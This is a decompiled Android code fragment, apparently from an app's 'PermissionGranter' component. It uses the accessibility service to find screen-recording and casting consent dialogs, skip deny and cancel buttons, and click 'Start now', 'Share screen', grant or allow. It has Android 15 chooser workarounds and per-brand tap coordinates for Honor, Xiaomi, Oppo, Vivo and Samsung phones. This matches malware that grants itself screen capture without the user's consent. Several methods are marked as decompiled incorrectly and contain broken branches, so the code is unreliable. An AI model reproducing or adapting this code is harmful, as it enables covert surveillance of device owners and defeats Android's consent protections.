            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
            if (child != null) {
                m211274c2(i + 1, child, arrayList);
                child.recycle();
            }
        }
    }

    /* renamed from: c3 */
    public static boolean m211275c3(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        try {
            if (str.equals("com.android.systemui") || str.equals("android")) {
                String[] strArr = {"Choose an app", "选择应用", "Select app", "Cast to", "投屏到", "Record with", "录制使用", "Share screen with", "与.*共享屏幕", "A single app", "整个设备", "Entire device", "分享或录制应用程序", "分享或录制应用", "分享", "录制", "Share", "share", "record", "Share or record an app", "Select source", "Choose what to record", "What would you like to record", "Record or cast", "choose", "选择", "select", "cast", "投屏", "投射", "Cast", "Screen cast", "Screen mirror", "record", "录制", "录屏", "share", "分享", "共享", "screen", "屏幕", "device", "设备", "app", "应用", "程序"};
                int i = 0;
                for (int i2 = 0; i2 < 46; i2++) {
                    if (m211301g5(accessibilityNodeInfo, strArr[i2])) {
                        i++;
                    }
                }
                if (i < 2 && m211272b9(accessibilityNodeInfo, 0) < 2) {
                    if (m211273c0(accessibilityNodeInfo, 0, 0) >= 2) {
                        return true;
                    }
                }
                return true;
            }
            return false;
        } catch (Exception e) {
            t60.m214705c6("PermissionGranter", "❌ [权限] 检测二次确认页面失败", e);
            return false;
        }
    }

    /* renamed from: c5 */
    public static ArrayList m211276c5(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        ArrayList arrayList = new ArrayList();
        try {
            CharSequence className = accessibilityNodeInfo.getClassName();
            if (className == null || (string = className.toString()) == null) {
                string = "";
            }
            if ((AbstractC0779a1.m213652a5(string, "Button", false) || AbstractC0779a1.m213652a5(string, "button", false) || AbstractC0779a1.m213652a5(string, "TextView", false) || AbstractC0779a1.m213652a5(string, "textview", false)) && accessibilityNodeInfo.isClickable()) {
                AccessibilityNodeInfo accessibilityNodeInfoObtain = AccessibilityNodeInfo.obtain(accessibilityNodeInfo);
                t60.m214694b5(accessibilityNodeInfoObtain, "obtain(node)");
                arrayList.add(accessibilityNodeInfoObtain);
            }
            int childCount = accessibilityNodeInfo.getChildCount();
            for (int i = 0; i < childCount; i++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
                if (child != null) {
                    arrayList.addAll(m211276c5(child));
                    child.recycle();
                }
            }
            return arrayList;
        } catch (Exception e) {
            t60.m214705c6("PermissionGranter", "❌ [权限] 查找所有按钮失败", e);
            return arrayList;
        }
    }

    /* renamed from: c6 */
    public static void m211277c6(AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        try {
            if (accessibilityNodeInfo.isClickable()) {
                arrayList.add(accessibilityNodeInfo);
            }
            int childCount = accessibilityNodeInfo.getChildCount();
            for (int i = 0; i < childCount; i++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
                if (child != null) {
                    m211277c6(child, arrayList);
                    if (!child.isClickable()) {
                        try {
                            child.recycle();
                        } catch (Exception unused) {
                        }
                    }
                }
            }
        } catch (Exception unused2) {
        }
    }

    /* renamed from: c7 */
    public static final void m211278c7(AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        if (accessibilityNodeInfo.isClickable()) {
            arrayList.add(accessibilityNodeInfo);
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                m211278c7(child, arrayList);
                if (!child.isClickable()) {
                    try {
                        child.recycle();
                    } catch (Exception unused) {
                    }
                }
            }
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:41:0x009a A[EDGE_INSN: B:86:0x009a->B:41:0x009a BREAK  A[LOOP:0: B:27:0x0068->B:87:?]] */
    /* JADX WARN: Removed duplicated region for block: B:44:0x009f  */
    /* JADX WARN: Removed duplicated region for block: B:45:0x00ae  */
    /* JADX WARN: Removed duplicated region for block: B:70:0x0147 A[EDGE_INSN: B:89:0x0147->B:70:0x0147 BREAK  A[LOOP:1: B:49:0x00f4->B:90:?]] */
    /* JADX WARN: Removed duplicated region for block: B:72:0x014f  */
    /* JADX WARN: Removed duplicated region for block: B:74:0x0159  */
    /* renamed from: c8 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static Pair m211279c8(AccessibilityNodeInfo accessibilityNodeInfo, int i) {
        String lowerCase;
        String string;
        boolean z;
        String string2;
        if (i > 10) {
            Boolean bool = Boolean.FALSE;
            return new Pair(bool, bool);
        }
        if (accessibilityNodeInfo.isClickable()) {
            CharSequence text = accessibilityNodeInfo.getText();
            if (text == null || (string2 = text.toString()) == null) {
                lowerCase = "";
            } else {
                lowerCase = string2.toLowerCase();
                t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase()");
            }
            CharSequence className = accessibilityNodeInfo.getClassName();
            if (className == null || (string = className.toString()) == null) {
                string = "";
            }
            String viewIdResourceName = accessibilityNodeInfo.getViewIdResourceName();
            String str = viewIdResourceName != null ? viewIdResourceName : "";
            ArrayList arrayListM213298i5 = AbstractC0715je.m213298i5(dh0.f55753a3, AbstractC0716jf.m213306g5("dismiss", "不允许", "禁止", "拒接"));
            if (arrayListM213298i5.isEmpty()) {
                z = !AbstractC0779a1.m213652a5(str, "cancel", false) || AbstractC0779a1.m213652a5(str, "deny", false) || AbstractC0779a1.m213652a5(str, "negative", false) || AbstractC0779a1.m213652a5(str, "dismiss", false);
                if (z) {
                    ArrayList arrayListM213298i52 = AbstractC0715je.m213298i5(AbstractC0715je.m213298i5(dh0.m212602a1(), dh0.f55750a0), AbstractC0716jf.m213306g5("start now", "立即开始", "Share screen", "共享屏幕", "现在开始", "begin", "开始录制", "开始投屏", "start recording", "start capture", "开始", "start", "授权", "grant", "同意", "agree", "yes", "accept"));
                    if (!arrayListM213298i52.isEmpty()) {
                        int size = arrayListM213298i52.size();
                        int i2 = 0;
                        while (i2 < size) {
                            Object obj = arrayListM213298i52.get(i2);
                            i2++;
                            if (AbstractC0779a1.m213652a5(lowerCase, (String) obj, true)) {
                                break;
                            }
                        }
                        if (!AbstractC0779a1.m213652a5(str, "allow", false)) {
                            if (!accessibilityNodeInfo.performAction(16)) {
                            }
                        }
                    } else if (!AbstractC0779a1.m213652a5(str, "allow", false) || AbstractC0779a1.m213652a5(str, "positive", false) || AbstractC0779a1.m213652a5(str, "start", false) || AbstractC0779a1.m213652a5(str, "grant", false) || AbstractC0779a1.m213652a5(str, "ok", false) || AbstractC0779a1.m213652a5(str, "confirm", false) || AbstractC0779a1.m213652a5(str, "button1", false) || (AbstractC0779a1.m213652a5(string, "button", true) && !z)) {
                        if (!accessibilityNodeInfo.performAction(16)) {
                            return new Pair(Boolean.TRUE, Boolean.FALSE);
                        }
                        t60.m214726f4("PermissionGranter", "⚠️ [权限] 智能匹配点击失败");
                    }
                } else {
                    t60.m214726f4("PermissionGranter", AbstractC0003a2.m34b5("⚠️ [权限] 跳过拒绝/取消按钮: 文本='", lowerCase, "', 类名='", string, "'"));
                }
            } else {
                int size2 = arrayListM213298i5.size();
                int i3 = 0;
                while (i3 < size2) {
                    Object obj2 = arrayListM213298i5.get(i3);
                    i3++;
                    if (AbstractC0779a1.m213652a5(lowerCase, (String) obj2, true)) {
                        break;
                    }
                }
                if (AbstractC0779a1.m213652a5(str, "cancel", false)) {
                    if (z) {
                    }
                }
            }
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i4 = 0; i4 < childCount; i4++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i4);
            if (child != null) {
                Pair pairM211279c8 = m211279c8(child, i + 1);
                child.recycle();
                if (((Boolean) pairM211279c8.f57556a0).booleanValue()) {
                    return pairM211279c8;
                }
            }
        }
        Boolean bool2 = Boolean.FALSE;
        return new Pair(bool2, bool2);
    }

    /* renamed from: c9 */
    public static boolean m211280c9(AccessibilityNodeInfo accessibilityNodeInfo, boolean z) {
        return m211281d0(accessibilityNodeInfo, 0, z);
    }

    /* JADX WARN: Code restructure failed: missing block: B:94:0x01ba, code lost:
    
        if (kotlin.text.AbstractC0779a1.m213652a5(r6, "button1", false) == false) goto L99;
     */
    /* renamed from: d0 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static boolean m211281d0(AccessibilityNodeInfo accessibilityNodeInfo, int i, boolean z) {
        String lowerCase;
        String string;
        String string2;
        if (i <= 10) {
            if (accessibilityNodeInfo.isClickable()) {
                CharSequence text = accessibilityNodeInfo.getText();
                if (text == null || (string2 = text.toString()) == null) {
                    lowerCase = "";
                } else {
                    lowerCase = string2.toLowerCase();
                    t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase()");
                }
                CharSequence className = accessibilityNodeInfo.getClassName();
                if (className == null || (string = className.toString()) == null) {
                    string = "";
                }
                String viewIdResourceName = accessibilityNodeInfo.getViewIdResourceName();
                String str = viewIdResourceName != null ? viewIdResourceName : "";
                if (z && (AbstractC0779a1.m213652a5(lowerCase, "选择", false) || AbstractC0779a1.m213652a5(lowerCase, "单个", false) || AbstractC0779a1.m213652a5(lowerCase, "应用", false) || AbstractC0779a1.m213652a5(lowerCase, "屏幕", false) || AbstractC0779a1.m213652a5(lowerCase, "整个", false) || AbstractC0779a1.m213652a5(lowerCase, "全屏", false) || AbstractC0779a1.m213652a5(lowerCase, "select", false) || AbstractC0779a1.m213652a5(lowerCase, "single", false) || AbstractC0779a1.m213652a5(lowerCase, "app", false) || AbstractC0779a1.m213652a5(lowerCase, "screen", false) || AbstractC0779a1.m213652a5(lowerCase, "entire", false) || AbstractC0779a1.m213652a5(lowerCase, "full", false))) {
                    t60.m214726f4("PermissionGranter", "⚠️ [权限] Android 15保护-跳过包含选择文本的按钮: '" + lowerCase + "'");
                    int childCount = accessibilityNodeInfo.getChildCount();
                    for (int i2 = 0; i2 < childCount; i2++) {
                        AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
                        if (child != null) {
                            boolean zM211281d0 = m211281d0(child, i + 1, z);
                            child.recycle();
                            if (zM211281d0) {
                            }
                        }
                    }
                } else {
                    ArrayList arrayListM213298i5 = AbstractC0715je.m213298i5(dh0.f55753a3, AbstractC0716jf.m213306g5("dismiss", "不允许", "禁止", "拒接"));
                    if (!arrayListM213298i5.isEmpty()) {
                        int size = arrayListM213298i5.size();
                        int i3 = 0;
                        while (i3 < size) {
                            Object obj = arrayListM213298i5.get(i3);
                            i3++;
                            if (AbstractC0779a1.m213652a5(lowerCase, (String) obj, true)) {
                                break;
                            }
                        }
                    }
                    if (AbstractC0779a1.m213652a5(str, "cancel", false) || AbstractC0779a1.m213652a5(str, "deny", false) || AbstractC0779a1.m213652a5(str, "negative", false) || AbstractC0779a1.m213652a5(str, "dismiss", false)) {
                        t60.m214726f4("PermissionGranter", AbstractC0003a2.m34b5("⚠️ [权限] 跳过拒绝/取消按钮: 文本='", lowerCase, "', 类名='", string, "'"));
                    } else {
                        ArrayList arrayListM213298i52 = AbstractC0715je.m213298i5(AbstractC0715je.m213298i5(dh0.m212602a1(), dh0.f55750a0), AbstractC0716jf.m213306g5("start now", "立即开始", "Share screen", "共享屏幕", "现在开始", "begin", "开始录制", "开始投屏", "start recording", "start capture", "开始", "start", "授权", "grant", "同意", "agree", "yes", "accept"));
                        if (!arrayListM213298i52.isEmpty()) {
                            int size2 = arrayListM213298i52.size();
                            int i4 = 0;
                            while (i4 < size2) {
                                Object obj2 = arrayListM213298i52.get(i4);
                                i4++;
                                if (AbstractC0779a1.m213652a5(lowerCase, (String) obj2, true)) {
                                    break;
                                }
                            }
                        }
                        if (!AbstractC0779a1.m213652a5(str, "allow", false)) {
                            if (!AbstractC0779a1.m213652a5(str, "positive", false)) {
                                if (!AbstractC0779a1.m213652a5(str, "start", false)) {
                                    if (!AbstractC0779a1.m213652a5(str, "grant", false)) {
                                        if (!AbstractC0779a1.m213652a5(str, "ok", false)) {
                                            if (!AbstractC0779a1.m213652a5(str, "confirm", false)) {
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        if (!accessibilityNodeInfo.performAction(16)) {
                        }
                    }
                }
                return true;
            }
            int childCount2 = accessibilityNodeInfo.getChildCount();
            for (int i5 = 0; i5 < childCount2; i5++) {
                AccessibilityNodeInfo child2 = accessibilityNodeInfo.getChild(i5);
                if (child2 != null) {
                    boolean zM211281d02 = m211281d0(child2, i + 1, z);
                    child2.recycle();
                    if (zM211281d02) {
                        return true;
                    }
                }
            }
        }
        return false;
    }

    /* renamed from: d4 */
    public static boolean m211282d4(AccessibilityNodeInfo accessibilityNodeInfo, String[] strArr, int i) {
        String string;
        String string2;
        if (i <= 6) {
            CharSequence text = accessibilityNodeInfo.getText();
            String str = "";
            if (text == null || (string = text.toString()) == null) {
                string = "";
            }
            CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
            if (contentDescription != null && (string2 = contentDescription.toString()) != null) {
                str = string2;
            }
            if (string.length() > 0 || str.length() > 0) {
                for (String str2 : strArr) {
                    if (Math.max(m211261a4(string, str2), m211261a4(str, str2)) > 0.6d) {
                        if (!accessibilityNodeInfo.isClickable()) {
                            AccessibilityNodeInfo accessibilityNodeInfoM211283d5 = m211283d5(accessibilityNodeInfo);
                            if (accessibilityNodeInfoM211283d5 != null && accessibilityNodeInfoM211283d5.performAction(16)) {
                                return true;
                            }
                        } else if (accessibilityNodeInfo.performAction(16)) {
                            return true;
                        }
                    }
                }
            }
            int childCount = accessibilityNodeInfo.getChildCount();
            for (int i2 = 0; i2 < childCount; i2++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
                if (child != null) {
                    if (m211282d4(child, strArr, i + 1)) {
                        child.recycle();
                        return true;
                    }
                    child.recycle();
                }
            }
        }
        return false;
    }

    /* renamed from: d5 */
    public static AccessibilityNodeInfo m211283d5(AccessibilityNodeInfo accessibilityNodeInfo) {
        int i = 0;
        for (AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent(); parent != null && i < 5; parent = parent.getParent()) {
            i++;
            if (parent.isClickable()) {
                return parent;
            }
        }
        t60.m214726f4("PermissionGranter", "⚠️ [权限] 未找到可点击父节点(已搜索" + i + "层)");
        return null;
    }

    /* renamed from: d6 */
    public static ArrayList m211284d6(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        ArrayList arrayList = new ArrayList();
        m211285d7(accessibilityNodeInfo, str, arrayList);
        return arrayList;
    }

    /* renamed from: d7 */
    public static void m211285d7(AccessibilityNodeInfo accessibilityNodeInfo, String str, ArrayList arrayList) {
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (t60.m214686a2(className != null ? className.toString() : null, str)) {
            arrayList.add(accessibilityNodeInfo);
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                m211285d7(child, str, arrayList);
                CharSequence className2 = child.getClassName();
                if (!t60.m214686a2(className2 != null ? className2.toString() : null, str)) {
                    try {
                        child.recycle();
                    } catch (Exception unused) {
                    }
                }
            }
        }
    }

    /* renamed from: d8 */
    public static ArrayList m211286d8(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        ArrayList arrayList = new ArrayList();
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = accessibilityNodeInfo.findAccessibilityNodeInfosByText(str);
        t60.m214694b5(listFindAccessibilityNodeInfosByText, "textNodes");
        arrayList.addAll(listFindAccessibilityNodeInfosByText);
        return arrayList;
    }

    /* renamed from: d9 */
    public static AccessibilityNodeInfo m211287d9(AccessibilityNodeInfo accessibilityNodeInfo) {
        try {
            if (m211271b8(accessibilityNodeInfo)) {
                return accessibilityNodeInfo;
            }
            int childCount = accessibilityNodeInfo.getChildCount();
            for (int i = 0; i < childCount; i++) {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
                if (child != null) {
                    AccessibilityNodeInfo accessibilityNodeInfoM211287d9 = m211287d9(child);
                    if (accessibilityNodeInfoM211287d9 != null) {
                        child.recycle();
                        return accessibilityNodeInfoM211287d9;
                    }
                    child.recycle();
                }
            }
            return null;
        } catch (Exception e) {
            t60.m214705c6("PermissionGranter", "❌ [权限] 查找权限节点失败", e);
            return null;
        }
    }

    /* renamed from: e0 */
    public static Pair m211288e0(Rect rect) {
        int length;
        String str = Build.BRAND;
        if (str == null) {
            str = "";
        }
        Locale locale = Locale.ROOT;
        String lowerCase = str.toLowerCase(locale);
        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        String str2 = Build.MANUFACTURER;
        if (str2 == null) {
            str2 = "";
        }
        String lowerCase2 = str2.toLowerCase(locale);
        t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        String str3 = Build.MODEL;
        String lowerCase3 = (str3 != null ? str3 : "").toLowerCase(locale);
        t60.m214694b5(lowerCase3, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        int i = rect.right - rect.left;
        int i2 = rect.bottom - rect.top;
        return (AbstractC0779a1.m213652a5(lowerCase3, "ana-", false) || AbstractC0779a1.m213652a5(lowerCase3, "els-", false)) ? m211289e1(rect, i, i2, 0.25f, 0.82f) : (AbstractC0779a1.m213652a5(lowerCase3, "lhn-", false) || AbstractC0779a1.m213652a5(lowerCase3, "yta-", false)) ? m211289e1(rect, i, i2, 0.28f, 0.82f) : AbstractC0779a1.m213652a5(lowerCase, "honor", false) ? m211289e1(rect, i, i2, 0.25f, 0.82f) : (AbstractC0779a1.m213652a5(lowerCase3, "mi ", false) || new Regex("^mi\\d+.*").m213646a2(lowerCase3)) ? m211289e1(rect, i, i2, 0.3f, 0.5f) : (AbstractC0779a1.m213652a5(lowerCase3, "m2012", false) || AbstractC0779a1.m213652a5(lowerCase3, "m2011", false)) ? m211289e1(rect, i, i2, 0.3f, 0.52f) : (AbstractC0779a1.m213652a5(lowerCase3, "redmi", false) || AbstractC0779a1.m213652a5(lowerCase3, "note", false)) ? m211289e1(rect, i, i2, 0.3f, 0.5f) : (AbstractC0779a1.m213652a5(lowerCase3, "pclm10", false) || AbstractC0779a1.m213652a5(lowerCase3, "pfjm10", false)) ? m211289e1(rect, i, i2, 0.5f, 0.5f) : AbstractC0779a1.m213679d2(lowerCase3, false, "oppo") ? m211289e1(rect, i, i2, 0.5f, 0.5f) : (!AbstractC0779a1.m213679d2(lowerCase3, false, "v") || 4 > (length = lowerCase3.length()) || length >= 9) ? (AbstractC0779a1.m213652a5(lowerCase3, "iqoo", false) || AbstractC0779a1.m213652a5(lowerCase3, "icqq", false)) ? m211289e1(rect, i, i2, 0.5f, 0.5f) : AbstractC0779a1.m213679d2(lowerCase3, false, "sm-") ? m211289e1(rect, i, i2, 0.26f, 0.5f) : (AbstractC0779a1.m213652a5(lowerCase2, "huawei", false) || AbstractC0779a1.m213652a5(lowerCase, "huawei", false) || AbstractC0779a1.m213652a5(lowerCase, "honor", false)) ? m211289e1(rect, i, i2, 0.25f, 0.5f) : (AbstractC0779a1.m213652a5(lowerCase2, "xiaomi", false) || AbstractC0779a1.m213652a5(lowerCase, "xiaomi", false) || AbstractC0779a1.m213652a5(lowerCase, "redmi", false)) ? m211289e1(rect, i, i2, 0.3f, 0.5f) : (AbstractC0779a1.m213652a5(lowerCase2, "oppo", false) || AbstractC0779a1.m213652a5(lowerCase, "oppo", false)) ? m211289e1(rect, i, i2, 0.27f, 0.5f) : (AbstractC0779a1.m213652a5(lowerCase2, "vivo", false) || AbstractC0779a1.m213652a5(lowerCase, "vivo", false) || AbstractC0779a1.m213652a5(lowerCase, "iqoo", false) || AbstractC0779a1.m213652a5(lowerCase, "icqq", false)) ? m211289e1(rect, i, i2, 0.27f, 0.5f) : (AbstractC0779a1.m213652a5(lowerCase2, "samsung", false) || AbstractC0779a1.m213652a5(lowerCase, "samsung", false)) ? m211289e1(rect, i, i2, 0.26f, 0.5f) : m211289e1(rect, i, i2, 0.5f, 0.5f) : m211289e1(rect, i, i2, 0.5f, 0.5f);
    }

    /* renamed from: e1 */
    public static final Pair m211289e1(Rect rect, int i, int i2, float f, float f2) {
        return new Pair(Integer.valueOf(rect.left + ((int) (i * f))), Integer.valueOf(rect.top + ((int) (i2 * f2))));
    }

    /* renamed from: e2 */
    public static Pair m211290e2(Rect rect) {
        int length;
        String str = Build.BRAND;
        if (str == null) {
            str = "";
        }
        Locale locale = Locale.ROOT;
        String lowerCase = str.toLowerCase(locale);
        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        String str2 = Build.MANUFACTURER;
        if (str2 == null) {
            str2 = "";
        }
        String lowerCase2 = str2.toLowerCase(locale);
        t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        String str3 = Build.MODEL;
        String lowerCase3 = (str3 != null ? str3 : "").toLowerCase(locale);
        t60.m214694b5(lowerCase3, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        int i = rect.right - rect.left;
        int i2 = rect.bottom - rect.top;
        if (AbstractC0779a1.m213652a5(lowerCase3, "ana-", false) || AbstractC0779a1.m213652a5(lowerCase3, "els-", false)) {
            return m211291e3(rect, i, i2, 0.65f, 0.83f);
        }
        if (AbstractC0779a1.m213652a5(lowerCase3, "lhn-", false) || AbstractC0779a1.m213652a5(lowerCase3, "yta-", false)) {
            return m211291e3(rect, i, i2, 0.65f, 0.83f);
        }
        if (Build.VERSION.SDK_INT >= 35 && AbstractC0779a1.m213652a5(lowerCase, "honor", false)) {
            return m211291e3(rect, i, i2, 0.65f, 0.82f);
        }
        if (AbstractC0779a1.m213652a5(lowerCase, "honor", false)) {
            return m211291e3(rect, i, i2, 0.65f, 0.83f);
        }
        if (AbstractC0779a1.m213652a5(lowerCase3, "mi ", false) || new Regex("^mi\\d+.*").m213646a2(lowerCase3)) {
            return m211291e3(rect, i, i2, 0.3f, 0.5f);
        }
        if (AbstractC0779a1.m213652a5(lowerCase3, "m2012", false) || AbstractC0779a1.m213652a5(lowerCase3, "m2011", false)) {
            return m211291e3(rect, i, i2, 0.3f, 0.52f);
        }
        if (AbstractC0779a1.m213652a5(lowerCase3, "redmi", false) || AbstractC0779a1.m213652a5(lowerCase3, "note", false)) {
            return m211291e3(rect, i, i2, 0.3f, 0.5f);
        }
        if (AbstractC0779a1.m213652a5(lowerCase, "oppo", false)) {
            return m211291e3(rect, i, i2, 0.5f, 0.5f);
        }
        if (AbstractC0779a1.m213652a5(lowerCase3, "pclm10", false) || AbstractC0779a1.m213652a5(lowerCase3, "pfjm10", false)) {
            return m211291e3(rect, i, i2, 0.5f, 0.5f);
        }
        if (AbstractC0779a1.m213679d2(lowerCase3, false, "oppo")) {
            return m211291e3(rect, i, i2, 0.5f, 0.5f);
        }
        if (AbstractC0779a1.m213679d2(lowerCase3, false, "v") && 4 <= (length = lowerCase3.length()) && length < 9) {
            return m211291e3(rect, i, i2, 0.27f, 0.5f);
        }
        if (AbstractC0779a1.m213652a5(lowerCase3, "iqoo", false) || AbstractC0779a1.m213652a5(lowerCase3, "icqq", false)) {
            return m211291e3(rect, i, i2, 0.27f, 0.5f);
        }
        if (AbstractC0779a1.m213679d2(lowerCase3, false, "sm-")) {
            return m211291e3(rect, i, i2, 0.26f, 0.5f);
        }
        if (AbstractC0779a1.m213652a5(lowerCase2, "huawei", false) || AbstractC0779a1.m213652a5(lowerCase, "huawei", false) || AbstractC0779a1.m213652a5(lowerCase, "honor", false)) {
            return m211291e3(rect, i, i2, 0.25f, 0.5f);
        }
        if (AbstractC0779a1.m213652a5(lowerCase2, "xiaomi", false) || AbstractC0779a1.m213652a5(lowerCase, "xiaomi", false) || AbstractC0779a1.m213652a5(lowerCase, "redmi", false)) {
            return m211291e3(rect, i, i2, 0.3f, 0.5f);
        }
        if (AbstractC0779a1.m213652a5(lowerCase2, "oppo", false) || AbstractC0779a1.m213652a5(lowerCase, "oppo", false)) {
            return m211291e3(rect, i, i2, 0.27f, 0.5f);
        }
        if (AbstractC0779a1.m213652a5(lowerCase2, "vivo", false) || AbstractC0779a1.m213652a5(lowerCase, "vivo", false) || AbstractC0779a1.m213652a5(lowerCase, "iqoo", false) || AbstractC0779a1.m213652a5(lowerCase, "icqq", false)) {
            return m211291e3(rect, i, i2, 0.27f, 0.5f);
        }
        if (AbstractC0779a1.m213652a5(lowerCase2, "samsung", false) || AbstractC0779a1.m213652a5(lowerCase, "samsung", false)) {
            return m211291e3(rect, i, i2, 0.26f, 0.5f);
        }
        return new Pair(Integer.valueOf(rect.centerX()), Integer.valueOf(rect.bottom - ((int) ((r3 - rect.centerY()) * 0.5f))));
    }

    /* renamed from: e3 */
    public static final Pair m211291e3(Rect rect, int i, int i2, float f, float f2) {
        return new Pair(Integer.valueOf(rect.left + ((int) (i * f))), Integer.valueOf(rect.top + ((int) (i2 * f2))));
    }

    /* renamed from: e6 */
    public static boolean m211292e6(AccessibilityNodeInfo accessibilityNodeInfo) {
        String lowerCase;
        String string;
        try {
            for (String str : (String[]) AbstractC0715je.m213288h5(AbstractC0715je.m213298i5(dh0.m212602a1(), AbstractC0716jf.m213306g5("START NOW", "Share screen", "共享屏幕", "Start now", "Start", "Begin recording", "Begin casting", "Start recording", "Start sharing", "开始录制", "开始投屏", "开始共享", "立即开始", "现在开始", "开始"))).toArray(new String[0])) {
                ArrayList arrayListM211286d8 = m211286d8(accessibilityNodeInfo, str);
                int size = arrayListM211286d8.size();
                int i = 0;
                while (i < size) {
                    Object obj = arrayListM211286d8.get(i);
                    i++;
                    AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) obj;
                    CharSequence text = accessibilityNodeInfo2.getText();
                    if (text == null || (string = text.toString()) == null) {
                        lowerCase = "";
                    } else {
                        lowerCase = string.toLowerCase(Locale.ROOT);
                        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                    }
                    ArrayList arrayListM213298i5 = AbstractC0715je.m213298i5(dh0.f55753a3, AbstractC0716jf.m213306g5("deny", "拒绝", "Deny", "Reject"));
                    if (!arrayListM213298i5.isEmpty()) {
                        int size2 = arrayListM213298i5.size();
                        int i2 = 0;
                        while (i2 < size2) {
                            Object obj2 = arrayListM213298i5.get(i2);
                            i2++;
                            if (AbstractC0779a1.m213652a5(lowerCase, (String) obj2, true)) {
                                t60.m214726f4("PermissionGranter", "⚠️ [权限] 跳过拒绝按钮: '" + ((Object) accessibilityNodeInfo2.getText()) + "'");
                                break;
                            }
                        }
                    }
                    if (accessibilityNodeInfo2.isClickable() || t60.m214686a2(accessibilityNodeInfo2.getClassName(), "android.widget.Button")) {
                        if (accessibilityNodeInfo2.performAction(16)) {
                            return true;
                        }
                    }
                }
            }
            return false;
        } catch (Exception e) {
            t60.m214705c6("PermissionGranter", "❌ [权限] Android 15全屏选择后确认处理失败", e);
            return false;
        }
    }

    /* renamed from: f1 */
    public static boolean m211293f1() {
        try {
            if (Build.VERSION.SDK_INT < 30) {
                Integer num = AbstractC0241a0.f51907a1;
                if ((num != null ? new Pair(num, AbstractC0241a0.f51908a2) : null) == null) {
                    return false;
                }
            }
            return true;
        } catch (Exception e) {
            t60.m214705c6("PermissionGranter", "❌ [权限] 检查MediaProjection权限失败", e);
            return false;
        }
    }

    /* renamed from: f2 */
    public static boolean m211294f2(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = accessibilityNodeInfo.findAccessibilityNodeInfosByText(str);
        t60.m214694b5(listFindAccessibilityNodeInfosByText, "nodes");
        boolean z = !listFindAccessibilityNodeInfosByText.isEmpty();
        Iterator<T> it = listFindAccessibilityNodeInfosByText.iterator();
        while (it.hasNext()) {
            try {
                ((AccessibilityNodeInfo) it.next()).recycle();
            } catch (Exception unused) {
            }
        }
        return z;
    }

    /* JADX WARN: Removed duplicated region for block: B:13:0x0023  */
    /* renamed from: f3 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static boolean m211295f3(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        String string2;
        boolean z;
        String string3;
        Bundle extras;
        CharSequence charSequence;
        CharSequence className = accessibilityNodeInfo.getClassName();
        String str = "";
        if (className == null || (string = className.toString()) == null) {
            string = "";
        }
        try {
            extras = accessibilityNodeInfo.getExtras();
        } catch (Exception unused) {
        }
        if (extras == null || (charSequence = extras.getCharSequence("AccessibilityNodeInfo.roleDescription")) == null) {
            string2 = "";
        } else {
            string2 = charSequence.toString();
            if (string2 == null) {
            }
        }
        boolean z2 = AbstractC0779a1.m213652a5(string, "Button", true) || AbstractC0779a1.m213652a5(string, "ImageButton", true) || AbstractC0779a1.m213652a5(string, "MaterialButton", true);
        boolean zEqualsIgnoreCase = string2.equalsIgnoreCase("button");
        CharSequence text = accessibilityNodeInfo.getText();
        if (text != null && (string3 = text.toString()) != null) {
            str = string3;
        }
        List list = dh0.f55750a0;
        if (!accessibilityNodeInfo.isClickable() || (list != null && list.isEmpty())) {
            z = false;
        } else {
            Iterator it = list.iterator();
            while (it.hasNext()) {
                if (AbstractC0779a1.m213652a5(str, (String) it.next(), true)) {
                    z = true;
                    break;
                }
            }
            z = false;
        }
        return z2 || zEqualsIgnoreCase || z;
    }

    /* renamed from: f7 */
    public static boolean m211296f7() {
        String lowerCase;
        String lowerCase2;
        try {
            String str = Build.BRAND;
            lowerCase = "";
            if (str != null) {
                lowerCase2 = str.toLowerCase(Locale.ROOT);
                t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            } else {
                lowerCase2 = "";
            }
            String str2 = Build.MANUFACTURER;
            if (str2 != null) {
                lowerCase = str2.toLowerCase(Locale.ROOT);
